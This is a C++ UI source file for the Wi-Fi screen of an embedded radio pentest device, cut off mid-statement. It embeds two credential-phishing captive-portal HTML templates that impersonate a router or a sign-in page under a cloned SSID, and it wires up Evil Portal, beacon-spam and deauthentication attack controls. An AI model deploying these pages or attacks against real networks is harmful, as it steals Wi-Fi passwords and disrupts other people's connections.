#include "ui/screens/wifi_screen.hpp"

#include <algorithm>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <dirent.h>
#include <ctime>
#include <fstream>
#include <map>
#include <string>

#include "application/sessions/session_service.hpp"
#include "domain/observations/observation.hpp"
#include "domain/radio/offensive.hpp"
#include "domain/radio/offensive_codec.hpp"
#include "domain/radio/oui.hpp"
#include "services/radio/capture_store.hpp"
#include "services/radio/deauth_detector.hpp"
#include "services/radio/evil_portal_service.hpp"
#include "services/radio/pcap_store.hpp"
#include "services/radio/probe_store.hpp"
#include "services/radio/radio_console.hpp"
#include "services/stats/activity_stats.hpp"
#include "services/radio/sniffer_store.hpp"
#include "services/radio/zigbee_store.hpp"
#include "services/storage/sd_logger.hpp"
#include "services/radio/radio_engine.hpp"
#include "services/radio/station_store.hpp"
#include "services/radio/wifi_scanner.hpp"
#include "ui/design_system/lv_color.hpp"

#if defined(ESP_PLATFORM)
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#endif

namespace spectra5::ui {

using tokens::SemanticColor;
using namespace spectra5::domain;

namespace {

// Embedded captive-portal templates (shown in the picker without needing the SD).
// {SSID} is substituted with the cloned network name; form posts wifi_password.
const char* const kBuiltinRouter =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>{SSID}</title><style>body{font-family:sans-serif;background:#0d47a1;color:#fff;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".c{background:#fff;color:#222;padding:28px;border-radius:12px;width:320px;text-align:center}"
    "input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:8px;"
    "box-sizing:border-box}button{width:100%;padding:12px;margin-top:10px;border:0;border-radius:8px;"
    "background:#0d47a1;color:#fff;font-weight:bold}</style></head><body><div class=c>"
    "<h2>{SSID}</h2><p>Router authentication required. Re-enter your Wi-Fi password.</p>"
    "<form method=POST action=/login><input name=wifi_password type=password "
    "placeholder='Wi-Fi password' autofocus><button>Reconnect</button></form></div></body></html>";

const char* const kBuiltinLogin =
    "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>{SSID}</title><style>body{font-family:sans-serif;background:#111;color:#eee;"
    "display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
    ".c{background:#1c1c1c;padding:32px;border-radius:12px;width:300px}"
    "input{width:100%;padding:12px;margin:8px 0;border:0;border-radius:8px;box-sizing:border-box}"
    "button{width:100%;padding:12px;margin-top:12px;border:0;border-radius:8px;background:#2d7;"
    "font-weight:bold}</style></head><body><div class=c><h2>Sign in to {SSID}</h2>"
    "<form method=POST action=/login><input name=email placeholder='Email' type=email>"
    "<input name=wifi_password placeholder='Password' type=password>"
    "<button>Connect</button></form></div></body></html>";
}  // namespace

namespace {

constexpr std::size_t kMaxSaved = 256;

#if defined(ESP_PLATFORM)
struct WifiSaveJob {
    lv_obj_t* status = nullptr;
    std::vector<WifiAccessPoint> aps;
    char message[96]{};
};

static void wifi_save_status_async(void* user)
{
    auto* job = static_cast<WifiSaveJob*>(user);
    if (job->status != nullptr && lv_obj_is_valid(job->status)) {
        lv_label_set_text(job->status, job->message);
    }
    delete job;
}

static void wifi_save_task(void* arg)
{
    auto* job = static_cast<WifiSaveJob*>(arg);
    auto* sessions = application::session_service();
    if (sessions == nullptr) {
        std::snprintf(job->message, sizeof(job->message), "No storage: cannot save scan.");
        lv_async_call(wifi_save_status_async, job);
        vTaskDelete(nullptr);
        return;
    }

    char name[48];
    const std::time_t t = std::time(nullptr);
    std::tm tm_buf{};
    localtime_r(&t, &tm_buf);
    std::strftime(name, sizeof(name), "Wi-Fi scan %H:%M:%S", &tm_buf);

    auto created = sessions->create(name);
    if (!created) {
        std::snprintf(job->message, sizeof(job->message), "Could not create session.");
        lv_async_call(wifi_save_status_async, job);
        vTaskDelete(nullptr);
        return;
    }

    std::size_t saved = 0;
    for (const auto& ap : job->aps) {
        if (saved >= kMaxSaved) {
            break;
        }
        MetadataMap meta;
        meta["ssid"]     = ap.hidden ? "<hidden>" : ap.ssid;
        meta["channel"]  = std::to_string(ap.channel);
        meta["band"]     = wifi_band_name(ap.band);
        meta["security"] = wifi_security_name(ap.security);
        sessions->record_observation(created.value().id, ObservationType::WifiAp, ap.bssid, ap.rssi,
                                     meta);
        ++saved;
    }

    std::snprintf(job->message, sizeof(job->message), "Saved %d access points to \"%s\".",
                  static_cast<int>(saved), name);
    lv_async_call(wifi_save_status_async, job);
    vTaskDelete(nullptr);
}
#endif

lv_obj_t* make_button(lv_obj_t* parent, const char* text, SemanticColor border)
{
    lv_obj_t* btn = lv_obj_create(parent);
    lv_obj_set_size(btn, LV_SIZE_CONTENT, tokens::TouchTarget);
    lv_obj_set_style_radius(btn, tokens::RadiusSm, 0);
    lv_obj_set_style_border_width(btn, 1, 0);
    lv_obj_set_style_border_color(btn, lv_semantic(border), 0);
    lv_obj_set_style_bg_color(btn, lv_semantic(SemanticColor::Surface), 0);
    lv_obj_set_style_bg_opa(btn, LV_OPA_COVER, 0);
    lv_obj_set_style_bg_color(btn, lv_semantic(SemanticColor::SurfaceRaised), LV_STATE_PRESSED);
    lv_obj_set_style_pad_hor(btn, tokens::SpaceLg, 0);
    lv_obj_clear_flag(btn, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(btn, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t* lbl = lv_label_create(btn);
    lv_label_set_text(lbl, text);
    lv_obj_set_style_text_color(lbl, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(lbl, &ibm_plex_mono_16, 0);
    lv_obj_add_flag(lbl, LV_OBJ_FLAG_EVENT_BUBBLE);
    lv_obj_center(lbl);
    return btn;
}

}  // namespace

WifiScreen::WifiScreen(lv_obj_t* parent)
{
    root_ = lv_obj_create(parent);
    lv_obj_set_size(root_, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_opa(root_, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(root_, 0, 0);
    lv_obj_set_style_pad_all(root_, tokens::SpaceXl, 0);
    lv_obj_set_style_pad_row(root_, tokens::SpaceMd, 0);
    lv_obj_set_flex_flow(root_, LV_FLEX_FLOW_COLUMN);

    lv_obj_t* header = lv_obj_create(root_);
    header_          = header;
    lv_obj_set_width(header, lv_pct(100));
    lv_obj_set_height(header, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_style_pad_column(header, tokens::SpaceMd, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* title = lv_label_create(header);
    lv_label_set_text(title, LV_SYMBOL_WIFI "  Wi-Fi");
    lv_obj_set_style_text_color(title, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(title, &ibm_plex_mono_32, 0);
    lv_obj_set_flex_grow(title, 1);

    // Band / view selector -- replaces the old All / 2.4 / 5 GHz / Channels button
    // row; lives compactly in the header next to the title.
    band_dd_ = lv_dropdown_create(header);
    lv_dropdown_set_options(band_dd_, "All bands\n2.4 GHz\n5 GHz\nChannels view");
    lv_obj_set_width(band_dd_, 190);
    brand_input(band_dd_);
    lv_obj_add_event_cb(band_dd_, &WifiScreen::on_band_changed, LV_EVENT_VALUE_CHANGED, this);

    metrics_ = lv_label_create(root_);
    lv_obj_set_style_text_color(metrics_, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_obj_set_style_text_font(metrics_, &ibm_plex_mono_16, 0);

    // Action buttons moved to their own row below the title (cleaner header).
    lv_obj_t* actions = lv_obj_create(root_);
    filters_row_      = actions;
    lv_obj_set_width(actions, lv_pct(100));
    lv_obj_set_height(actions, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(actions, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(actions, 0, 0);
    lv_obj_set_style_pad_all(actions, 0, 0);
    lv_obj_set_style_pad_column(actions, tokens::SpaceSm, 0);
    lv_obj_set_style_pad_row(actions, tokens::SpaceSm, 0);
    lv_obj_set_flex_flow(actions, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_clear_flag(actions, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t* scan_btn = make_button(actions, LV_SYMBOL_REFRESH " Scan", SemanticColor::Accent);
    scan_btn_          = scan_btn;
    scan_lbl_          = lv_obj_get_child(scan_btn, 0);
    lv_obj_add_event_cb(scan_btn, &WifiScreen::on_scan_clicked, LV_EVENT_CLICKED, this);
    lv_obj_t* save_btn = make_button(actions, LV_SYMBOL_SAVE " Save", SemanticColor::Success);
    save_btn_          = save_btn;
    lv_obj_add_event_cb(save_btn, &WifiScreen::on_save_clicked, LV_EVENT_CLICKED, this);

    if (services::has_evil_portal()) {
        lv_obj_t* portal_btn = make_button(actions, LV_SYMBOL_WARNING " Evil Portal", SemanticColor::Danger);
        lv_obj_add_event_cb(portal_btn, &WifiScreen::on_portal_open, LV_EVENT_CLICKED, this);
    }

    {
        auto* engine = services::radio_engine();
        if (engine != nullptr &&
            domain::has_capability(engine->capabilities(), domain::RadioCapability::BeaconSpam)) {
            lv_obj_t* spam_btn = make_button(actions, LV_SYMBOL_WARNING " WiFi Spam", SemanticColor::Warning);
            spam_btn_          = lv_obj_get_child(spam_btn, 0);
            lv_obj_add_event_cb(spam_btn, &WifiScreen::on_beacon_clicked, LV_EVENT_CLICKED, this);
        }
        // Defensive: are we being deauthed?
        if (engine != nullptr &&
            domain::has_capability(engine->capabilities(), domain::RadioCapability::Monitor)) {
            lv_obj_t* det_btn =
                make_button(actions, LV_SYMBOL_EYE_OPEN " Detector", SemanticColor::Accent);
            detect_lbl_ = lv_obj_get_child(det_btn, 0);
            lv_obj_add_event_cb(det_btn, &WifiScreen::on_detect_toggle, LV_EVENT_CLICKED, this);

            lv_obj_t* sniff_btn =
                make_button(actions, LV_SYMBOL_LIST " Sniffer", SemanticColor::Accent);
            sniff_lbl_ = lv_obj_get_child(sniff_btn, 0);
            lv_obj_add_event_cb(sniff_btn, &WifiScreen::on_sniff_toggle, LV_EVENT_CLICKED, this);
        }
    }

    lv_obj_t* search_row = lv_obj_create(root_);
    search_row_          = search_row;
    lv_obj_set_width(search_row, lv_pct(100));
    lv_obj_set_height(search_row, LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(search_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(search_row, 0, 0);
    lv_obj_set_style_pad_all(search_row, 0, 0);
    lv_obj_clear_flag(search_row, LV_OBJ_FLAG_SCROLLABLE);

    search_ = lv_textarea_create(search_row);
    lv_textarea_set_one_line(search_, true);
    lv_textarea_set_placeholder_text(search_, "Filter SSID");
    lv_obj_set_width(search_, lv_pct(100));
    brand_input(search_);  // otherwise the LVGL default theme paints it cool grey
    lv_obj_add_event_cb(search_, &WifiScreen::on_search_changed, LV_EVENT_VALUE_CHANGED, this);
    lv_obj_add_event_cb(search_, &WifiScreen::on_search_focus, LV_EVENT_FOCUSED, this);

    status_ = lv_label_create(root_);
    lv_obj_set_style_text_color(status_, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_obj_set_style_text_font(status_, &ibm_plex_mono_14, 0);
    lv_label_set_text(status_, "");

    body_ = lv_obj_create(root_);
    lv_obj_set_width(body_, lv_pct(100));
    lv_obj_set_flex_grow(body_, 1);
    lv_obj_set_style_bg_opa(body_, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(body_, 0, 0);
    lv_obj_set_style_pad_all(body_, 0, 0);

    if (services::wifi_scanner() == nullptr) {
        set_status("Wi-Fi scanner unavailable on this platform.");
        return;
    }

    rebuild_list();
    update_filter_styles();
    timer_ = lv_timer_create(&WifiScreen::on_timer, 1200, this);
    update_scan_button();
    set_status("Press Scan to start Wi-Fi discovery.");
}

WifiScreen::~WifiScreen()
{
    pause_timer();
    // Drop any deferred detail transitions so they cannot fire on a freed `this`.
    lv_async_call_cancel(&WifiScreen::on_show_detail_async, this);
    lv_async_call_cancel(&WifiScreen::on_exit_detail_async, this);
    // Stop any running deauth flood / beacon spam / SAE flood + tear down the modal.
    if (attack_timer_ != nullptr) {
        lv_timer_del(attack_timer_);
        attack_timer_ = nullptr;
    }
    if (beacon_timer_ != nullptr) {
        lv_timer_del(beacon_timer_);
        beacon_timer_ = nullptr;
    }
    if (sae_timer_ != nullptr) {
        lv_timer_del(sae_timer_);
        sae_timer_ = nullptr;
    }
    if (twin_deauth_timer_ != nullptr) {
        lv_timer_del(twin_deauth_timer_);
        twin_deauth_timer_ = nullptr;
    }
    if (monitor_timer_ != nullptr) {
        lv_timer_del(monitor_timer_);
        monitor_timer_ = nullptr;
    }
    if (monitor_modal_ != nullptr) {
        lv_obj_del(monitor_modal_);
        monitor_modal_ = nullptr;
    }
    if (attack_modal_ != nullptr) {
        lv_obj_del(attack_modal_);
        attack_modal_ = nullptr;
    }
    if (spam_modal_ != nullptr) {
        lv_obj_del(spam_modal_);
        spam_modal_  = nullptr;
        spam_status_ = nullptr;
    }
    if (auto* scanner = services::wifi_scanner()) {
        scanner->stop();
        scanner->release_radio();
    }
    if (timer_ != nullptr) {
        lv_timer_del(timer_);
        timer_ = nullptr;
    }
}

void WifiScreen::set_status(const char* text)
{
    lv_label_set_text(status_, text);
}

void WifiScreen::pause_timer()
{
    if (timer_ != nullptr) {
        lv_timer_pause(timer_);
    }
}

void WifiScreen::resume_timer()
{
    if (timer_ != nullptr) {
        lv_timer_resume(timer_);
    }
}

void WifiScreen::update_scan_button()
{
    if (scan_lbl_ == nullptr) {
        return;
    }
    auto* scanner = services::wifi_scanner();
    if (scanner != nullptr && scanner->is_scanning()) {
        lv_label_set_text(scan_lbl_, LV_SYMBOL_STOP " Stop");
    } else {
        lv_label_set_text(scan_lbl_, LV_SYMBOL_REFRESH " Scan");
    }
}

void WifiScreen::update_filter_styles()
{
    if (band_dd_ == nullptr) {
        return;
    }
    const uint16_t idx = channels_view_
                             ? 3
                             : (band_filter_ == 0 ? 1 : (band_filter_ == 1 ? 2 : 0));
    lv_dropdown_set_selected(band_dd_, idx);
}

void WifiScreen::on_band_changed(lv_event_t* event)
{
    auto* self = static_cast<WifiScreen*>(lv_event_get_user_data(event));
    auto* dd   = static_cast<lv_obj_t*>(lv_event_get_current_target(event));
    if (self == nullptr || dd == nullptr) {
        return;
    }
    self->pause_timer();
    const uint16_t sel = lv_dropdown_get_selected(dd);  // 0 all, 1 2.4, 2 5, 3 channels
    if (sel == 3) {
        self->channels_view_ = true;
    } else {
        self->channels_view_ = false;
        self->band_filter_   = (sel == 1) ? 0 : (sel == 2) ? 1 : -1;
    }
    self->last_sig_.clear();
    if (!self->in_detail_) {
        self->rebuild_list();
    }
    self->resume_timer();
}

void WifiScreen::prepare_body_layout()
{
    lv_obj_clean(body_);
    table_          = nullptr;
    detail_console_ = nullptr;  // deleted with body_'s children; avoid a dangling ptr
    if (channels_view_) {
        lv_obj_set_flex_flow(body_, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_row(body_, tokens::SpaceXs, 0);
        lv_obj_set_scroll_dir(body_, LV_DIR_VER);
    } else {
        lv_obj_set_flex_flow(body_, LV_FLEX_FLOW_ROW);
        lv_obj_set_style_pad_row(body_, 0, 0);
        lv_obj_set_scroll_dir(body_, LV_DIR_NONE);
    }
}

void WifiScreen::on_timer(lv_timer_t* timer)
{
    auto* self = static_cast<WifiScreen*>(lv_timer_get_user_data(timer));
    if (self == nullptr) {
        return;
    }
    services::SdLogger::instance().flush();  // write queued captures to SD (UI thread)
    if (self->attack_modal_ != nullptr) {
        if (self->monitor_mode_) {
            self->rebuild_station_list();  // refresh the discovered-client list
        } else {
            self->update_attack_console();  // keep the deauth console live
        }
        return;
    }
    if (self->in_detail_) {
        if (self->detail_console_ != nullptr) {
            const uint32_t rev = services::RadioConsole::instance().revision();
            if (rev != self->detail_console_rev_) {
                self->detail_console_rev_ = rev;
                const std::string t       = services::RadioConsole::instance().text();
                lv_label_set_text(self->detail_console_, t.empty() ? "(idle)" : t.c_str());
            }
        }
        return;  // target view: only the attack console is live
    }
    self->update_scan_button();
    self->rebuild_list();
}

void WifiScreen::update_attack_console()
{
    if (attack_console_ == nullptr) {
        return;
    }
    const uint32_t rev = services::RadioConsole::instance().revision();
    if (rev == console_rev_) {
        return;  // nothing new
    }
    console_rev_           = rev;
    const std::string text = services::RadioConsole::instance().text();
    lv_label_set_text(attack_console_, text.empty() ? "(idle)" : text.c_str());
}

bool contains_ci(const std::string& haystack, const std::string& needle)
{
    if (needle.empty()) {
        return true;
    }
    auto lower = [](std::string s) {
        for (char& c : s) {
            c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        }
        return s;
    };
    return lower(haystack).find(lower(needle)) != std::string::npos;
}

// Parse "aa:bb:cc:dd:ee:ff" into 6 bytes. Returns false if malformed.
bool parse_mac(const std::string& text, domain::MacAddr& out)
{
    int values[6] = {0};
    const int parsed = std::sscanf(text.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1],
                                   &values[2], &values[3], &values[4], &values[5]);
    if (parsed != 6) {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        out[i] = static_cast<uint8_t>(values[i] & 0xFF);
    }
    return true;
}

void WifiScreen::rebuild_list()
{
    auto* scanner = services::wifi_scanner();
    if (scanner == nullptr) {
        return;
    }

    auto all = scanner->snapshot();

    filtered_.clear();
    int count_24 = 0;
    int count_5  = 0;
    long sig_sum = 0;
    for (const auto& ap : all) {
        if (ap.band == WifiBand::GHz24) {
            ++count_24;
        } else {
            ++count_5;
        }
        if (band_filter_ == 0 && ap.band != WifiBand::GHz24) continue;
        if (band_filter_ == 1 && ap.band != WifiBand::GHz5) continue;
        if (!contains_ci(ap.hidden ? std::string("hidden") : ap.ssid, ssid_filter_)) continue;
        filtered_.push_back(ap);
        sig_sum += ap.rssi;
    }

    std::sort(filtered_.begin(), filtered_.end(),
              [](const WifiAccessPoint& a, const WifiAccessPoint& b) { return a.rssi > b.rssi; });

    char metrics[128];
    if (band_filter_ == 1 && count_5 == 0 && !all.empty()) {
        std::snprintf(metrics, sizeof(metrics),
                      "%s  -  %d APs shown  (5 GHz filter: C6 radio is 2.4 GHz only)",
                      scanner->is_scanning() ? "Scanning" : "Idle",
                      static_cast<int>(filtered_.size()));
    } else {
        std::snprintf(metrics, sizeof(metrics), "%s  -  %d APs shown  (2.4 GHz: %d   5 GHz: %d)",
                      scanner->is_scanning() ? "Scanning" : "Idle",
                      static_cast<int>(filtered_.size()), count_24, count_5);
    }
    lv_label_set_text(metrics_, metrics);

    const std::string sig = std::to_string(filtered_.size()) + ":" + std::to_string(sig_sum) + ":" +
                            std::to_string(band_filter_) + ":" + ssid_filter_ + ":" +
                            (channels_view_ ? "ch" : "tbl");
    if (sig == last_sig_) {
        return;
    }
    last_sig_ = sig;

    const int layout = channels_view_ ? 1 : 0;
    if (layout != layout_mode_) {
        layout_mode_ = layout;
        prepare_body_layout();
    }

    if (channels_view_) {
        lv_obj_clean(body_);
        build_channels();
    } else {
        build_table();
    }
}

void WifiScreen::build_table()
{
    if (table_ == nullptr) {
        table_ = lv_table_create(body_);
        lv_obj_set_size(table_, lv_pct(100), lv_pct(100));
        lv_obj_set_style_text_font(table_, &ibm_plex_mono_14, LV_PART_ITEMS);
        // Brand-paint the table (otherwise lv_table cells render in default grey).
        lv_obj_set_style_bg_opa(table_, LV_OPA_TRANSP, LV_PART_MAIN);
        lv_obj_set_style_border_width(table_, 0, LV_PART_MAIN);
        lv_obj_set_style_bg_color(table_, lv_semantic(SemanticColor::Surface), LV_PART_ITEMS);
        lv_obj_set_style_bg_opa(table_, LV_OPA_COVER, LV_PART_ITEMS);
        lv_obj_set_style_text_color(table_, lv_semantic(SemanticColor::TextPrimary), LV_PART_ITEMS);
        lv_obj_set_style_border_color(table_, lv_semantic(SemanticColor::Border), LV_PART_ITEMS);
        lv_obj_set_style_border_width(table_, 1, LV_PART_ITEMS);
        lv_obj_set_style_bg_color(table_, lv_semantic(SemanticColor::SurfaceRaised),
                                  LV_PART_ITEMS | LV_STATE_PRESSED);
        lv_table_set_column_width(table_, 0, 560);  // SSID
        lv_table_set_column_width(table_, 1, 100);   // Ch
        lv_table_set_column_width(table_, 2, 260);   // Security
        lv_table_set_column_width(table_, 3, 180);   // RSSI
        lv_obj_add_event_cb(table_, &WifiScreen::on_row_selected, LV_EVENT_VALUE_CHANGED, this);
    }

    lv_table_set_column_count(table_, 4);
    lv_table_set_row_count(table_, filtered_.size() + 1);
    lv_table_set_cell_value(table_, 0, 0, "SSID");
    lv_table_set_cell_value(table_, 0, 1, "Ch");
    lv_table_set_cell_value(table_, 0, 2, "Security");
    lv_table_set_cell_value(table_, 0, 3, "RSSI");

    for (std::size_t i = 0; i < filtered_.size(); ++i) {
        const auto& ap = filtered_[i];
        const std::string name = ap.hidden ? "<hidden>" : ap.ssid;
        lv_table_set_cell_value(table_, i + 1, 0, name.c_str());
        lv_table_set_cell_value_fmt(table_, i + 1, 1, "%d", ap.channel);
        lv_table_set_cell_value(table_, i + 1, 2, wifi_security_name(ap.security));
        lv_table_set_cell_value_fmt(table_, i + 1, 3, "%d dBm", ap.rssi);
    }
}

void WifiScreen::build_channels()
{
    // body_ layout is prepared by prepare_body_layout(); only add channel rows here.

    // Count access points per channel.
    std::map<int, int> per_channel;
    int max_count = 1;
    for (const auto& ap : filtered_) {
        const int c = ++per_channel[ap.channel];
        if (c > max_count) {
            max_count = c;
        }
    }

    if (per_channel.empty()) {
        lv_obj_t* empty = lv_label_create(body_);
        lv_label_set_text(empty, "No access points match the current filter.");
        lv_obj_set_style_text_color(empty, lv_semantic(SemanticColor::TextSecondary), 0);
        lv_obj_set_style_text_font(empty, &ibm_plex_mono_18, 0);
        return;
    }

    for (const auto& [channel, count] : per_channel) {
        lv_obj_t* row = lv_obj_create(body_);
        lv_obj_set_width(row, lv_pct(100));
        lv_obj_set_height(row, 40);
        lv_obj_set_style_bg_opa(row, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_pad_all(row, 0, 0);
        lv_obj_set_style_pad_column(row, tokens::SpaceMd, 0);
        lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
        lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t* label = lv_label_create(row);
        lv_label_set_text_fmt(label, "Ch %3d", channel);
        lv_obj_set_width(label, 80);
        lv_obj_set_style_text_color(label, lv_semantic(SemanticColor::TextPrimary), 0);
        lv_obj_set_style_text_font(label, &ibm_plex_mono_16, 0);

        lv_obj_t* track = lv_obj_create(row);
        lv_obj_set_height(track, 20);
        lv_obj_set_flex_grow(track, 1);
        lv_obj_set_style_bg_opa(track, LV_OPA_TRANSP, 0);
        lv_obj_set_style_border_width(track, 0, 0);
        lv_obj_set_style_pad_all(track, 0, 0);
        lv_obj_clear_flag(track, LV_OBJ_FLAG_SCROLLABLE);

        lv_obj_t* bar = lv_obj_create(track);
        lv_obj_set_height(bar, 20);
        lv_obj_set_width(bar, lv_pct((count * 100) / max_count));
        lv_obj_set_style_radius(bar, tokens::RadiusSm, 0);
        lv_obj_set_style_border_width(bar, 0, 0);
        lv_obj_set_style_bg_color(bar, lv_semantic(SemanticColor::Accent), 0);
        lv_obj_set_style_bg_opa(bar, LV_OPA_COVER, 0);
        lv_obj_align(bar, LV_ALIGN_LEFT_MID, 0, 0);

        lv_obj_t* num = lv_label_create(row);
        lv_label_set_text_fmt(num, "%d", count);
        lv_obj_set_width(num, 48);
        lv_obj_set_style_text_color(num, lv_semantic(SemanticColor::TextSecondary), 0);
        lv_obj_set_style_text_font(num, &ibm_plex_mono_16, 0);
    }
}

namespace {
// Transparent, border-less, non-scrolling flex container helper.
lv_obj_t* make_panel(lv_obj_t* parent, lv_flex_flow_t flow)
{
    lv_obj_t* p = lv_obj_create(parent);
    lv_obj_set_style_bg_opa(p, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(p, 0, 0);
    lv_obj_set_style_pad_all(p, 0, 0);
    lv_obj_set_flex_flow(p, flow);
    lv_obj_clear_flag(p, LV_OBJ_FLAG_SCROLLABLE);
    return p;
}
}  // namespace

void WifiScreen::show_detail(const WifiAccessPoint& ap)
{
    in_detail_ = true;
    table_     = nullptr;
    last_sig_.clear();
    if (keyboard_ != nullptr) {
        lv_obj_add_flag(keyboard_, LV_OBJ_FLAG_HIDDEN);
    }
    // Target view: hide all the AP-list chrome so only this AP is shown.
    for (lv_obj_t* o : {header_, metrics_, filters_row_, search_row_}) {
        if (o != nullptr) {
            lv_obj_add_flag(o, LV_OBJ_FLAG_HIDDEN);
        }
    }
    lv_obj_clean(body_);
    lv_obj_set_flex_flow(body_, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(body_, tokens::SpaceMd, 0);
    lv_obj_clear_flag(body_, LV_OBJ_FLAG_SCROLLABLE);  // everything fits, no scrolling

    // Top bar: Back + the SSID as the title.
    lv_obj_t* topbar = make_panel(body_, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(topbar, lv_pct(100));
    lv_obj_set_height(topbar, LV_SIZE_CONTENT);
    lv_obj_set_style_pad_column(topbar, tokens::SpaceMd, 0);
    lv_obj_set_flex_align(topbar, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    // SSID flush-left (aligned with the BSSID/details below), Back at top-right.
    lv_obj_t* title = lv_label_create(topbar);
    lv_label_set_long_mode(title, LV_LABEL_LONG_DOT);
    lv_label_set_text(title, ap.hidden ? "<hidden network>" : ap.ssid.c_str());
    lv_obj_set_style_text_color(title, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(title, &ibm_plex_mono_32, 0);
    lv_obj_set_flex_grow(title, 1);
    lv_obj_t* back = make_button(topbar, LV_SYMBOL_LEFT " Back", SemanticColor::Border);
    lv_obj_add_event_cb(back, &WifiScreen::on_back_clicked, LV_EVENT_CLICKED, this);

    // Two columns filling the rest of the screen (no scroll).
    lv_obj_t* content = make_panel(body_, LV_FLEX_FLOW_ROW);
    lv_obj_set_width(content, lv_pct(100));
    lv_obj_set_flex_grow(content, 1);
    lv_obj_set_style_pad_column(content, tokens::SpaceLg, 0);

    // Left column: AP details + signal timeline.
    lv_obj_t* left = make_panel(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(left, lv_pct(100));
    lv_obj_set_flex_grow(left, 1);
    lv_obj_set_style_pad_row(left, tokens::SpaceMd, 0);

    lv_obj_t* info = lv_label_create(left);
    lv_label_set_long_mode(info, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(info, lv_pct(100));
    char text[256];
    std::snprintf(text, sizeof(text),
                  "BSSID:  %s\nBand:  %s     Channel:  %d\nSecurity:  %s\nRSSI:  %d dBm",
                  ap.bssid.c_str(), wifi_band_name(ap.band), ap.channel,
                  wifi_security_name(ap.security), ap.rssi);
    lv_label_set_text(info, text);
    lv_obj_set_style_text_color(info, lv_semantic(SemanticColor::TextPrimary), 0);
    lv_obj_set_style_text_font(info, &ibm_plex_mono_18, 0);

    lv_obj_t* tl = lv_label_create(left);
    lv_label_set_text(tl, "Signal timeline");
    lv_obj_set_style_text_color(tl, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_obj_set_style_text_font(tl, &ibm_plex_mono_14, 0);

    lv_obj_t* chart = lv_chart_create(left);
    lv_obj_set_width(chart, lv_pct(100));
    lv_obj_set_flex_grow(chart, 1);
    lv_chart_set_type(chart, LV_CHART_TYPE_LINE);
    lv_chart_set_range(chart, LV_CHART_AXIS_PRIMARY_Y, -95, -30);
    const std::size_t points = ap.rssi_history.empty() ? 1 : ap.rssi_history.size();
    lv_chart_set_point_count(chart, static_cast<uint32_t>(points));
    lv_chart_series_t* ser =
        lv_chart_add_series(chart, lv_semantic(SemanticColor::Accent), LV_CHART_AXIS_PRIMARY_Y);
    for (int v : ap.rssi_history) {
        lv_chart_set_next_value(chart, ser, v);
    }
    lv_chart_refresh(chart);

    // Right column: attacks.
    lv_obj_t* right = make_panel(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_height(right, lv_pct(100));
    lv_obj_set_flex_grow(right, 1);
    lv_obj_set_style_pad_row(right, tokens::SpaceMd, 0);

    lv_obj_t* atk_hdr = lv_label_create(right);
    lv_label_set_text(atk_hdr, LV_SYMBOL_WARNING " Attacks");
    lv_obj_set_style_text_color(atk_hdr, lv_semantic(SemanticColor::TextSecondary), 0);
    lv_obj_set_style_text_font(atk_hdr, &ibm_plex_mono_18, 0);

    auto* engine = services::radio_engine();
    const bool can_deauth =
        engine != nullptr &&
        domain::has_capability(engine->capabilities(), domain::RadioCapability::Deauth);
    lv_obj_t* deauth_btn = make_button(right, LV_SYMBOL_WARNING " Deauth AP", SemanticColor::Danger);
    lv_obj_set_width(deauth_btn, lv_pct(100));
    if (can_deauth) {
        lv_obj_add_event_cb(deauth_btn, &WifiScreen::on_attack_open, LV_EVENT_CLICKED, this);
    } else {
        lv_obj_add_state(deauth_btn, LV_STATE_DISABLED);
    }

    const bool can_stations =
        engine != nullptr &&
